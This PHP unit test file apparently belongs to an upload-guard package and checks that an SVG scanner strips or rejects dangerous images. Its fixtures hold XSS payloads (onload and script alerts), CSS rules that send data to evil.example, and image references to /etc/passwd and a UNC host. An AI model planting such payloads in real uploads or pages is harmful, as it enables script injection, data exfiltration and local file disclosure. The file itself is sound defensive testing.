<?php

namespace Abdian\UploadGuard\Tests\Unit;

use Abdian\UploadGuard\SvgScanner;
use Abdian\UploadGuard\Tests\Support\Fixtures;
use Abdian\UploadGuard\Tests\TestCase;

class SvgScannerTest extends TestCase
{
    private SvgScanner $scanner;

    protected function setUp(): void
    {
        parent::setUp();
        $this->scanner = new SvgScanner();
    }

    private function scan(string $bytes, string $name = 's.svg'): array
    {
        $path = $this->scratchPath($name);
        Fixtures::writeTo($path, $bytes);

        return $this->scanner->scan($path);
    }

    public function test_unquoted_event_handler_is_neutralized_or_rejected(): void
    {
        // Unquoted handlers make the SVG malformed XML: the sanitizer either
        // strips the handler or the file is rejected (fail closed). Both are OK.
        $result = $this->scan(Fixtures::svgUnquotedHandler());
        if ($result['clean'] === null) {
            $this->assertFalse($result['safe'], 'Unparseable dangerous SVG must be rejected');
        } else {
            $this->assertDoesNotMatchRegularExpression('/onload|onclick/i', (string) $result['clean']);
        }
    }

    public function test_quoted_event_handler_is_stripped(): void
    {
        $result = $this->scan(Fixtures::svgQuotedHandler());
        $this->assertNotNull($result['clean']);
        $this->assertDoesNotMatchRegularExpression('/onload|onclick/i', (string) $result['clean']);
        $this->assertTrue($result['modified']);
    }

    public function test_whitespace_javascript_uri_is_neutralized(): void
    {
        $result = $this->scan(Fixtures::svgWhitespaceJsUri());
        $this->assertStringNotContainsStringIgnoringCase('javascript:', (string) $result['clean']);
    }

    public function test_script_tag_removed(): void
    {
        $result = $this->scan(Fixtures::svgWithScript());
        $this->assertDoesNotMatchRegularExpression('/<script/i', (string) $result['clean']);
    }

    public function test_external_dtd_system_is_handled(): void
    {
        $result = $this->scan(Fixtures::svgExternalDtdSystem());
        $this->assertDoesNotMatchRegularExpression('/<!DOCTYPE/i', (string) $result['clean']);
        $this->assertDoesNotMatchRegularExpression('/etc\/passwd/i', (string) $result['clean']);
    }

    public function test_external_dtd_public_is_handled(): void
    {
        $result = $this->scan(Fixtures::svgExternalDtdPublic());
        $this->assertDoesNotMatchRegularExpression('/attacker\.example/i', (string) $result['clean']);
    }

    public function test_benign_svg_is_preserved(): void
    {
        $result = $this->scan(Fixtures::benignSvg());
        $this->assertTrue($result['safe']);
        $this->assertNotNull($result['clean']);
        // Visual elements survive sanitization.
        $this->assertMatchesRegularExpression('/<rect/i', (string) $result['clean']);
        $this->assertMatchesRegularExpression('/<circle/i', (string) $result['clean']);
    }

    public function test_reject_mode_rejects_dirty_svg(): void
    {
        config(['safeguard.svg_scanning.mode' => 'reject']);
        $result = $this->scan(Fixtures::svgUnquotedHandler());
        $this->assertFalse($result['safe']);
    }

    public function test_sanitize_file_writes_clean_bytes_back(): void
    {
        $path = $this->scratchPath('inplace.svg');
        Fixtures::writeTo($path, Fixtures::svgWithScript());

        $ok = $this->scanner->sanitizeFile($path);
        $this->assertTrue($ok);

        $stored = file_get_contents($path);
        $this->assertDoesNotMatchRegularExpression('/<script/i', $stored);
    }

    public function test_css_import_remote_reference_is_rejected(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
            . '<style>@import url("https://evil.example/x.css");</style></svg>';
        $result = $this->scan($svg);
        $this->assertFalse($result['safe'], '@import remote CSS must be unsafe');
    }

    public function test_css_font_face_remote_reference_is_rejected(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
            . '<style>@font-face{font-family:x;src:url("https://evil.example/f.woff");}</style></svg>';
        $result = $this->scan($svg);
        $this->assertFalse($result['safe'], '@font-face remote CSS must be unsafe');
    }

    public function test_css_attribute_selector_exfil_url_is_rejected(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
            . '<style>input[value^="a"]{background:url("https://evil.example/leak?c=a")}</style></svg>';
        $result = $this->scan($svg);
        $this->assertFalse($result['safe'], 'CSS attribute-selector exfil url() must be unsafe');
    }

    public function test_css_expression_is_rejected(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
            . '<style>rect{width:expression(alert(1));}</style></svg>';
        $result = $this->scan($svg);
        $this->assertFalse($result['safe'], 'CSS expression() must be unsafe');
    }

    public function test_image_absolute_local_href_is_rejected(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">'
            . '<image xlink:href="/etc/passwd" width="10" height="10"/></svg>';
        $result = $this->scan($svg);
        $this->assertFalse($result['safe'], 'Absolute local href must be unsafe');
    }

    public function test_image_file_scheme_href_is_rejected(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">'
            . '<image xlink:href="file:///etc/passwd" width="10" height="10"/></svg>';
        $result = $this->scan($svg);
        $this->assertFalse($result['safe'], 'file: scheme href must be unsafe');
    }

    public function test_image_unc_href_is_rejected(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">'
            . '<image xlink:href="\\\\evil-host\\share\\x" width="10" height="10"/></svg>';
        $result = $this->scan($svg);
        $this->assertFalse($result['safe'], 'UNC href must be unsafe');
    }

    public function test_fragment_and_data_href_are_allowed(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">'
            . '<use xlink:href="#a"/><rect id="a" width="10" height="10"/></svg>';
        $result = $this->scan($svg);
        $this->assertTrue($result['safe'], 'Same-document #fragment href must remain allowed');
    }

    public function test_utf16le_bom_svg_with_handler_is_rejected(): void
    {
        $utf8 = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">'
            . '<script>alert(1)</script></svg>';
        $utf16 = "\xFF\xFE" . mb_convert_encoding($utf8, 'UTF-16LE', 'UTF-8');

        // sanitize mode: dangerous handler/script must be stripped from output.
        $result = $this->scan($utf16, 'utf16.svg');
        $this->assertNotNull($result['clean'], 'UTF-16 SVG must be decoded and sanitized, not skipped');
        $this->assertDoesNotMatchRegularExpression('/onload/i', (string) $result['clean']);
        $this->assertDoesNotMatchRegularExpression('/<script/i', (string) $result['clean']);
        $this->assertTrue($result['modified'], 'Dangerous UTF-16 SVG must be modified by sanitization');
    }

    public function test_utf16le_bom_dirty_svg_is_rejected_in_reject_mode(): void
    {
        config(['safeguard.svg_scanning.mode' => 'reject']);
        $utf8 = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>';
        $utf16 = "\xFF\xFE" . mb_convert_encoding($utf8, 'UTF-16LE', 'UTF-8');
        $result = $this->scan($utf16, 'utf16r.svg');
        $this->assertFalse($result['safe'], 'Dirty UTF-16 SVG must be rejected, not silently skipped');
    }

    public function test_benign_svg_without_style_or_remote_refs_passes(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">'
            . '<rect width="20" height="20" fill="red"/><circle cx="10" cy="10" r="5"/></svg>';
        $result = $this->scan($svg);
        $this->assertTrue($result['safe'], 'Clean benign SVG must stay safe');
        $this->assertMatchesRegularExpression('/<rect/i', (string) $result['clean']);
        $this->assertMatchesRegularExpression('/<circle/i', (string) $result['clean']);
    }

    public function test_allowed_tags_config_is_honored_without_crashing(): void
    {
        // Regression: the custom allowlist class must be autoloadable (PSR-4) and
        // actually applied — configuring allowed_tags previously crashed the scan.
        config(['safeguard.svg_scanning.allowed_tags' => ['svg', 'rect']]);
        $result = $this->scan(Fixtures::benignSvg());
        $this->assertNotNull($result['clean'], 'Configuring allowed_tags must not crash the scanner');
        $this->assertMatchesRegularExpression('/<rect/i', (string) $result['clean']);
        $this->assertDoesNotMatchRegularExpression('/<circle/i', (string) $result['clean'], 'tags outside the allowlist must be stripped');
    }
}
